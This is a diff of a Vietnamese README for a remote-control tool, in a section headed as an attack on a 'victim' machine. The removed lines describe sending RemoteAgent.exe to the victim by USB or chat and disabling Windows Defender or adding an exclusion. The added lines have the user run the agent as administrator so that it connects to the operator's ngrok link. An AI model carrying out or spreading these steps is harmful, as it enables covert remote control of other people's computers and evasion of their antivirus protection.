@@ -88,24 +88,18 @@ RemoteControl/
     3.Lấy hàng: Truy cập vào thư mục sau để lấy file: RemoteAgent\bin\Release\net6.0\win-x64\publish\ 👉 Bạn sẽ thấy file RemoteAgent.exe (Dung lượng khoảng ~60MB).
 ### 📍 Bước 3: Tấn công (Trên máy nạn nhân)
 
-    1. Gửi file: Copy file RemoteAgent.exe (vừa lấy ở Bước 2) sang máy nạn nhân (qua USB, Drive, Zalo...).
-
-    2. ⚠️ Lưu ý quan trọng:
-
-        *Vì là tool điều khiển từ xa, Windows Defender có thể sẽ chặn file.
-
-        *Cần tắt Real-time protection hoặc thêm file vào danh sách loại trừ (Exclusions) trước khi chạy.
-
-    3.Chạy file:
-
-        *Nhấn chuột phải vào khoảng trống trong thư mục chứa file, chọn "Open in Terminal" (hoặc mở CMD Admin).
-
-        *Gõ lệnh kết nối:
-
-            PowerShell
-
-            .\RemoteAgent.exe <link-ngrok-của-bạn>
-                Ví dụ: .\RemoteAgent.exe https://abc123xyz.ngrok-free.app
+   1. **Copy đường dẫn thư mục:** Vào thư mục chứa file `RemoteAgent.exe`, bấm vào thanh địa chỉ ở trên cùng và copy đường dẫn.
+   
+   2. **Mở PowerShell Admin:**
+       - Nhấn phím **Windows**, gõ chữ `powershell`.
+       - Chọn **"Run as Administrator"** bên tay phải.
+   
+   3. **Di chuyển vào thư mục:**
+       - Gõ lệnh: `cd "dán-đường-dẫn-vừa-copy-vào-đây"` rồi Enter.
+   
+   4. **Chạy lệnh kết nối:**
+       ```powershell
+       .\RemoteAgent.exe <link-ngrok-của-bạn>
 
 ### Bước 6: Mở giao diện điều khiển
 
